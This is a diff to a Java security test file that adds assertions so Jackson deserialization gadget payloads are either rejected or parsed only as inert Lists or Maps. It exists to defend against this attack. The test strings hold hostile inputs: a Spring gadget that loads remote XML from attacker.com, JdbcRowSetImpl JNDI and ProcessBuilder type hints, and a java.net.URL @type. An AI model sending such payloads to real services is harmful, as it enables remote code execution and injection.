@@ -16,6 +16,7 @@ package ddf.catalog.source.solr;
 import static org.hamcrest.MatcherAssert.assertThat;
 import static org.hamcrest.Matchers.containsString;
 import static org.hamcrest.Matchers.greaterThanOrEqualTo;
+import static org.hamcrest.Matchers.instanceOf;
 import static org.hamcrest.Matchers.is;
 import static org.hamcrest.Matchers.notNullValue;
 import static org.hamcrest.Matchers.nullValue;
@@ -131,11 +132,20 @@ public class JacksonDeserializationSecurityTest {
             + "\"http://attacker.com/evil.xml\""
             + "]";
 
+    Object result = null;
     try {
-      objectMapper.readValue(springGadgetJson, Object.class);
+      result = objectMapper.readValue(springGadgetJson, Object.class);
       // If no exception, verify it wasn't instantiated as the dangerous class
     } catch (Exception e) {
       // Expected - class not found or blocked
+    }
+    // Either parsing was blocked (result == null) or the payload was deserialized as
+    // an inert List - never as the Spring gadget class.
+    if (result != null) {
+      assertThat(
+          "Spring gadget payload must deserialize as an inert List, not the gadget class",
+          result,
+          is(instanceOf(java.util.List.class)));
     }
   }
 
@@ -153,11 +163,20 @@ public class JacksonDeserializationSecurityTest {
             + "\"autoCommit\":true"
             + "}";
 
+    Object result = null;
     try {
-      objectMapper.readValue(jdbcGadgetJson, Object.class);
+      result = objectMapper.readValue(jdbcGadgetJson, Object.class);
       // If no exception, the dangerous class wasn't instantiated
     } catch (Exception e) {
       // Expected - class blocked or type info not processed
+    }
+    // The @type hint must be ignored: the payload is either rejected (result == null) or
+    // deserialized as an inert Map - never as a JdbcRowSetImpl that could trigger JNDI.
+    if (result != null) {
+      assertThat(
+          "JdbcRowSet @type hint must deserialize as an inert Map, not the gadget class",
+          result,
+          is(instanceOf(java.util.Map.class)));
     }
   }
 
@@ -236,11 +255,22 @@ public class JacksonDeserializationSecurityTest {
     }
     largeArray.append("]");
 
+    Object result = null;
     try {
-      objectMapper.readValue(largeArray.toString(), Object.class);
+      result = objectMapper.readValue(largeArray.toString(), Object.class);
       // Large arrays should be parseable but not cause resource exhaustion
     } catch (JsonProcessingException e) {
       // Acceptable if limits are enforced
+    }
+    // Either a limit was enforced (result == null) or the full array parsed within the
+    // 5s @Timeout to exactly 100000 elements - proving no resource exhaustion occurred.
+    if (result != null) {
+      assertThat(
+          "Large array should parse to a List", result, is(instanceOf(java.util.List.class)));
+      assertThat(
+          "Parsed array should contain all 100000 elements",
+          ((java.util.List<?>) result).size(),
+          is(100000));
     }
   }
 
@@ -367,11 +397,20 @@ public class JacksonDeserializationSecurityTest {
             + "\"name\":\"test\""
             + "}";
 
+    Object result = null;
     try {
-      objectMapper.readValue(multiTypeJson, Object.class);
+      result = objectMapper.readValue(multiTypeJson, Object.class);
       // If parsed, verify dangerous classes weren't instantiated
     } catch (JsonMappingException e) {
       // Expected - unrecognized properties
+    }
+    // Both @type and @class hints must be ignored: the payload is either rejected
+    // (result == null) or deserialized as an inert Map - never as ProcessBuilder.
+    if (result != null) {
+      assertThat(
+          "Multiple type hints must deserialize as an inert Map, not a dangerous class",
+          result,
+          is(instanceOf(java.util.Map.class)));
     }
   }
 
@@ -467,11 +506,20 @@ public class JacksonDeserializationSecurityTest {
     String classLoadJson =
         "{" + "\"@type\":\"java.net.URL\"," + "\"val\":\"http://attacker.com/\"" + "}";
 
+    Object result = null;
     try {
-      objectMapper.readValue(classLoadJson, Object.class);
+      result = objectMapper.readValue(classLoadJson, Object.class);
       // If parsed, verify URL class wasn't instantiated
     } catch (JsonMappingException e) {
       // Expected - type info not processed
+    }
+    // The @type hint must not drive class loading: the payload is either rejected
+    // (result == null) or deserialized as an inert Map - never as a java.net.URL.
+    if (result != null) {
+      assertThat(
+          "Arbitrary class-loading @type must deserialize as an inert Map, not java.net.URL",
+          result,
+          is(instanceOf(java.util.Map.class)));
     }
   }
 
